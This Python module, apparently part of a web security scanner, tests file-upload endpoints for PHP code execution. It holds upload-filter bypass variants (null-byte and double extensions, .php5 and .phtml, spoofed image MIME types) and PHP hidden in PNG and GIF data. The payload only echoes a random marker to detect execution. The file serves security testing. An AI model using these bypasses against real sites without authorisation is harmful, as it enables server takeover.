import random
import string
from checks.attacks import attacks
from misc.Constants import Constants

class php_rce_check():
    def __init__(self, injector, globalOptionsPanel, callback_helpers, dl_matchers):
        self.attacks = attacks(callback_helpers, dl_matchers)
        self.check(injector, globalOptionsPanel)

    def check(self, injector, globalOptionsPanel):
        # automated approach with BackdooredFile class
        self.attacks._servercode_rce_backdoored_file(injector, self._php_gen_payload, self._php_rce_params, globalOptionsPanel)

        # Boring, classic, straight forward php file:
        self.attacks._servercode_rce_simple(injector, self._php_gen_payload, self._php_rce_params)

        # Manual tests with special cases for image metadata injection:
        lang, types, _ = self._php_rce_params(".png", "image/png")
        self.attacks._servercode_rce_png_idatchunk_phponly(injector, types)

        payload_exact_13_len = '<?echo "AB"?>'
        lang, types, _ = self._php_rce_params(".gif", "image/gif")
        self.attacks._servercode_rce_gif_content(injector, lang, payload_exact_13_len, types)

    def _php_rce_params(self, extension, mime, content=""):
        lang = "PHP"

        # The different file extensions can vary in several ways:
        # - the original extension the file had that was uploaded in the base request, self._marker_orig_ext, eg. .png
        # - the payload extension, for example if we upload php code it would be .php
        # - the real file extension, for example .gif if we produced a gif file that has php code in the comment, extension

        # PHP file extensions rely on Apache's AddHandler option, and there are horrible examples
        # on the Internet, such as:
        # AddHandler x-httpd-php .php .php3 .php4 .php5 .phtml
        # According to this, .pht is very unlikely: http://stackoverflow.com/questions/32912839/what-are-pht-files
        if mime:
            # This means we're hiding php code in metadata of a file type
            types = {
                ('', Constants.MARKER_ORIG_EXT, ''),
                ('', '.php' + Constants.MARKER_ORIG_EXT, ''),
                # ('', '.php'+self._marker_orig_ext, mime),
                # ('', '.php.'+extension, ''),
                ('', '.php' + extension, mime),
                ('', '.php\x00' + extension, mime),
                ('', '.php%00' + extension, mime),
                # ('', '.php5'+extension, mime),
                ('', '.php', ''),
                # ('', '.php5', ''),
                ('', '.php', mime),
                ('', '.php5', mime),
                ('', '.phtml', mime)
            }
        else:
            # This means it is plain php files we're uploading
            mime = 'application/x-php'
            types = {
                ('', Constants.MARKER_ORIG_EXT, ''),
                ('', '.php' + Constants.MARKER_ORIG_EXT, ''),
                # ('', '.php'+self._marker_orig_ext, mime),
                ('', '.php\x00' + Constants.MARKER_ORIG_EXT, ''),
                ('', '.php%00' + Constants.MARKER_ORIG_EXT, ''),
                # ('', '.php\x00'+self._marker_orig_ext, mime),
                # ('', '.php%00'+self._marker_orig_ext, mime),
                # ('', '.php5'+extension, mime),
                ('', '.php', ''),
                ('', '.php5', ''),
                ('', '.phtml', ''),
                ('', '.php', mime),
                # ('', '.php5', mime),
            }
        # Problem: when we have XMP data the meta data will look like this:
        # <?xpacket begin=' ' id='W5M0MpCehiHzreSzNTczkc9d'?>
        # while PHP servers are fine with a ?> somewhere, they will fail at <? as xpacket is not
        # a PHP function . Therefore we need to remove those. However, a lot of metadata formats
        # are actually not looking for <?xpacket, but rather just check for <x:xmpmeta .
        # Actually, OSX screenshots will have XMP data, but no <?xpacket specification
        # Therefore, let's just replace the <?xpacket .* ?> tags with spaces. As long as the
        # <x:xmpmeta stays intact we should be fine.
        xpacket = "<?xpacket"
        xpacket_end = "?>"
        while xpacket in content:
            start = content.index(xpacket)
            end = content.index(xpacket_end, start) + len(xpacket_end)
            content = content[:start] + " " * (end - start) + content[end:]
        return lang, types, content

    def _php_gen_payload(self):
        r = ''.join(random.sample(string.ascii_letters, 5))
        payload = '<?php echo "' + r + '-InJ" . "eCt."."TeSt";?>'
        expect = r + '-InJeCt.TeSt'
        return payload, expect
